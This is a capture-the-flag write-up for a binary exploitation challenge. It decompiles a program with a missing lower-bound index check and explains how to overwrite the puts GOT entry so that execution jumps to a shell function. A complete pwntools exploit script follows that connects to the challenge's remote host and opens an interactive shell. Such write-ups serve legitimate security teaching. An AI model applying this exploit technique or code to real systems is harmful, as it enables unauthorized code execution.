# GOT

This challenge provide us a binary. Looking at it on IDA we get this:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  idx = 0;
  puts("Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?");
  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
  fwrite("> ", 1uLL, 2uLL, stdout);
  __isoc99_scanf("%d", &idx);
  if ( idx > 4 )
  {
    puts("Huuuhhh, i do not know that many people yet...");
    _exit(0);
  }
  puts("Oh really ? What's the correct spelling ?");
  fwrite("> ", 1uLL, 2uLL, stdout);
  read(0, &PNJs[idx], 0x20uLL);
  puts("Thanks for the help, next time i'll give you a shell, i already prepared it :)");
  return 0;
}
```

```c
void __cdecl shell()
{
  system("/bin/sh");
}
```

Here, the vulnerability lies in the `read(0, &PNJs[idx], 0x20uLL)` call. Although `idx` is checked for upper bounds (`idx > 4`), there is no lower bounds check. This allows us to provide a negative index, accessing memory before the `PNJs` array.

Since the program calls `puts()` after reading our input, we can **overwrite its GOT entry** with the address of the `shell()` function. When the program subsequently calls` puts()`, execution will instead jump to `shell()`, giving us a shell.

## solve.py


```py
from pwn import *

elf = ELF('./got')

pnjs = elf.symbols['PNJs']
puts_got = elf.got['puts']
shell_addr = elf.symbols['shell']

idx = (puts_got - pnjs) // 0x20         # -4
padding = (puts_got - pnjs) % 0x20      # 8
payload = b'\x00' * padding + p64(shell_addr)

# r = process(elf.path)
r = remote("got-40f2465cc05e5ddc.deploy.phreaks.fr", 443, ssl=True)

r.recvuntil(b'Which name is misspelled ?')
r.sendline(str(idx).encode())
r.recvuntil(b"What's the correct spelling ?")
r.send(payload)
r.interactive()
```
